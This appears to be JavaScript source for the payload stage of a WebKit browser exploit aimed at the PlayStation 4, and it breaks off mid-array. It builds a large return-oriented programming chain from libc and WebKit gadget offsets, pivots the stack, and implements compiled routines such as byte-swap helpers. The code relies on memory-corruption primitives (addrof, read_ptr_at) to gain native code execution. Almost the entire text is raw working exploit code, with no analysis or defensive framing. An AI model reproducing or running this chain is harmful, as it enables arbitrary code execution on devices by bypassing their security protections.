var ropchain_array = new Uint32Array(55506);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0; // STUB
ropchain_offset = 2;
set_gadgets([
libc_base+788575, //pop rax
ropchain+65720, //rdi_bak
webkit_base+14461559, //mov [rax], rdi
libc_base+206806, //pop rdi
ropchain+65680, //stack_bottom
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
ropchain+112, //ret_addr
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+190280, //_main
//ret_addr:
libc_base+811575, //pop rsp
ropchain+65680 //stack_bottom
]);
//_ps4_printf_buffer:
var printf_buf_offset = 128;
ropchain_offset = 32;
set_gadget(printf_buf);
//_ps4_printf_fd:
db([4294967295, 4294967295]); // -0x1
//stack:
ropchain_offset += 16384;
//stack_bottom:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
main_ret,
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//rdi_bak:
//_pivot_back_addr:
db([0, 0]); // 0x0
set_gadgets([
pivot_addr,
//___builtin_bswap16:
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+65800, //L0
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L0:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+65896, //L3
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+65928, //L5
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L3:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L4:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L5:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+66016, //L6
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+66032, //L7
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L6:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L7:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+66192, //L12
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66160, //L9
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+66144, //L10
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L10:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L9:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L11:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L12:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+66248, //L13
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L13:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+66352, //L15
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+66384, //L17
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66368, //L16
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L15:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L16:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L17:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+66544, //L21
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66512, //L18
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66496, //L20
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L20:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L18:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L19:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L21:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+66648, //L23
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66632, //L22
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L22:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L23:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L24:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L25:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+66856, //L28
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66824, //L27
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L27:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L26:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L28:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+66960, //L30
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66944, //L29
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L29:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L30:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+67040, //L31
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L31:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L32:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+67144, //L34
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+67160, //L35
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L34:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L35:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+67320, //L40
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67288, //L37
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+67272, //L38
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L38:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L37:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L39:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L40:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+67376, //L41
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L41:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+67480, //L43
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+67512, //L45
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67496, //L44
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L43:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L44:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L45:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+67672, //L49
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67640, //L46
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67624, //L48
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L48:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L46:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L47:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L49:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+67776, //L51
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67760, //L50
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L50:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L51:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L52:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L53:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+67976, //L56
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67944, //L55
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L55:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L54:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L56:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68080, //L58
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+68064, //L57
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L57:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L58:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68192, //L61
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+68160, //L60
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L60:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L59:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L61:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68256, //L62
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L62:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+68312, //L64
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L64:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+68456, //L66
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68472, //L68
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+68440, //L67
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L67:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L66:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L68:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+68592, //L70
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68608, //L71
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+68576, //L69
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L69:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L70:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L71:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+68704, //L72
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68720, //L73
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L72:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L73:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+68832, //L74
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68816, //L75
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L75:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L74:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+68920, //L77
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+68904, //L76
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L76:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L77:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69016, //L78
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69032, //L79
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L78:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L79:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69144, //L80
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69128, //L81
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L81:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L80:
db([0, 0]); // 0x0
//___builtin_bswap32:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69216, //L82
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L82:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69312, //L85
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+69344, //L87
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L85:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L86:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L87:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+69432, //L88
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69448, //L89
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L88:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L89:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+69600, //L91
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69632, //L94
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69616, //L92
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+69584, //L93
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L93:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L91:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L92:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L94:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+69728, //L96
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+69712, //L95
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L95:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L96:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L97:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L98:
db([24, 0]); // 0x18
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69928, //L101
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+69896, //L100
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L100:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L99:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+70032, //L103
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70016, //L102
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L102:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L103:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+70120, //L104
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L104:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L105:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+70224, //L107
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+70240, //L108
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L107:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L108:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+70392, //L110
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+70424, //L113
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+70408, //L111
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+70376, //L112
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L112:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L110:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L111:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L113:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+70520, //L115
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70504, //L114
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L114:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L115:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L117:
db([16711680, 0]); // 0xff0000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+70632, //L118
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L118:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L120:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L121:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+70864, //L124
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+70832, //L123
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L123:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L122:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L124:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+70968, //L126
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70952, //L125
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L125:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+71024, //L128
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L128:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71080, //L129
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L129:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+71192, //L131
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L131:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L132:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+71296, //L134
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+71312, //L135
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L134:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L135:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+71464, //L137
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+71496, //L140
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+71480, //L138
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+71448, //L139
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L139:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L137:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L138:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L140:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+71592, //L142
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+71576, //L141
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L141:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L142:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L144:
db([65280, 0]); // 0xff00
set_gadgets([
libc_base+191168, //mov rax, [rdi]
